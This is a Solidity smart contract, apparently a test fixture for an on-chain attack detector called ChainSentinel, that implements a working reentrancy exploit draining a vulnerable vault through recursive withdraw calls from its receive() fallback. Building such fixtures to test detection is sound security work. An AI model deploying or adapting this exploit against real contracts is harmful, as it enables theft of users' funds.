// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title ReentrancyAttacker
 * @notice Exploits VulnerableVault via recursive withdraw.
 *         ChainSentinel never sees this source code -- it detects the
 *         attack purely from on-chain execution traces.
 */
contract ReentrancyAttacker {
    IVault public vault;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentrancyCount;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        attackAmount = msg.value;

        // Deposit seed amount
        vault.deposit{value: msg.value}();

        // Trigger recursive withdraw
        vault.withdraw(msg.value);
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        reentrancyCount++;
        // Re-enter vault if it still has funds
        if (address(vault).balance >= attackAmount && reentrancyCount < 10) {
            vault.withdraw(attackAmount);
        }
    }
}
